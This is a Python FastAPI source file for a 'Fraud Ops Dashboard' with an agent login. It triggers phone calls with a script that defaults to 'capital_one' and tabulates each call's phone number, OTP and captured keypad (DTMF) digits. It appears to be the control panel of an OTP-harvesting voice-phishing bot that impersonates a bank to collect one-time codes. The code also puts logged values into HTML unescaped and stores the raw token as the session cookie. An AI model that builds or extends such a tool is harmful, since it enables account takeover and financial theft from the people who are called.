# ui.py
from fastapi import APIRouter, Request, Form
from fastapi.responses import HTMLResponse, RedirectResponse
from auth import require_role
from storage import call_logs, dtmf_logs
import requests, os

router = APIRouter()

# 🔐 LOGIN PAGE
@router.get("/login", response_class=HTMLResponse)
async def login():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Agent Login</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                max-width: 400px;
                margin: 50px auto;
                padding: 20px;
                background: #f5f5f5;
            }
            .login-box {
                background: white;
                padding: 30px;
                border-radius: 8px;
                box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            }
            h2 { color: #333; margin-top: 0; }
            input {
                width: 100%;
                padding: 12px;
                margin: 10px 0;
                border: 1px solid #ddd;
                border-radius: 4px;
                box-sizing: border-box;
            }
            button {
                width: 100%;
                padding: 12px;
                background: #007bff;
                color: white;
                border: none;
                border-radius: 4px;
                cursor: pointer;
                font-size: 16px;
            }
            button:hover { background: #0056b3; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h2>Agent Login</h2>
            <form method="post" action="/login">
                <input name="token" type="password" placeholder="Enter Agent Token" required />
                <button type="submit">Login</button>
            </form>
        </div>
    </body>
    </html>
    """

@router.post("/login")
async def login_post(token: str = Form(...)):
    response = RedirectResponse("/ui", status_code=302)
    response.set_cookie("session", token, httponly=True)
    return response

# 📊 DASHBOARD
@router.get("/ui", response_class=HTMLResponse)
async def ui(request: Request):
    require_role(request, "agent")
    rows = ""
    for sid, data in call_logs.items():
        digits = "".join(dtmf_logs.get(sid, []))
        rows += f"""
        <tr>
          <td>{sid}</td>
          <td>{data['phone']}</td>
          <td>{data['script']}</td>
          <td>
            <details>
              <summary>Show OTP</summary>
              {data['otp']}
            </details>
          </td>
          <td>{digits}</td>
          <td>{data['result']}</td>
        </tr>
        """
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Fraud Ops Dashboard</title>
        <style>
            body {{
                font-family: Arial, sans-serif;
                margin: 20px;
                background: #f5f5f5;
            }}
            .container {{
                max-width: 1200px;
                margin: 0 auto;
                background: white;
                padding: 20px;
                border-radius: 8px;
            }}
            h2 {{ color: #333; }}
            h3 {{ color: #666; margin-top: 30px; }}
            form {{
                background: #f9f9f9;
                padding: 20px;
                border-radius: 4px;
                margin-bottom: 20px;
            }}
            label {{
                display: inline-block;
                width: 100px;
                margin-right: 10px;
            }}
            input {{
                padding: 8px;
                margin: 5px;
                border: 1px solid #ddd;
                border-radius: 4px;
            }}
            button {{
                padding: 10px 20px;
                background: #28a745;
                color: white;
                border: none;
                border-radius: 4px;
                cursor: pointer;
            }}
            button:hover {{ background: #218838; }}
            table {{
                width: 100%;
                border-collapse: collapse;
                margin-top: 20px;
            }}
            th, td {{
                padding: 12px;
                text-align: left;
                border: 1px solid #ddd;
            }}
            th {{
                background: #007bff;
                color: white;
            }}
            tr:nth-child(even) {{ background: #f9f9f9; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h2>Fraud Ops Dashboard</h2>
            
            <h3>Trigger Manual Call</h3>
            <form method="post" action="/ui/call">
                <label>Phone:</label>
                <input name="phone" placeholder="+1555..." required />
                <br>
                <label>Script:</label>
                <input name="script" value="capital_one"/>
                <br>
                <label>Language:</label>
                <input name="language" value="en-US"/>
                <br>
                <button type="submit">Start Call</button>
            </form>
            
            <h3>Sessions</h3>
            <table>
                <tr>
                    <th>Session</th>
                    <th>Phone</th>
                    <th>Script</th>
                    <th>OTP</th>
                    <th>DTMF</th>
                    <th>Result</th>
                </tr>
                {rows}
            </table>
        </div>
    </body>
    </html>
    """

# 📞 MANUAL CALL TRIGGER
@router.post("/ui/call")
async def ui_call(
    request: Request,
    phone: str = Form(...),
    script: str = Form(...),
    language: str = Form(...)
):
    require_role(request, "agent")
    requests.post(
        f"https://{os.getenv('FLY_APP_NAME')}.fly.dev/fraud/manual-call",
        headers={"X-Auth-Token": os.getenv("ADMIN_TOKEN")},
        json={
            "phone": phone,
            "script": script,
            "language": language,
            "otp": "000000"
        }
    )
    return RedirectResponse("/ui", status_code=302)
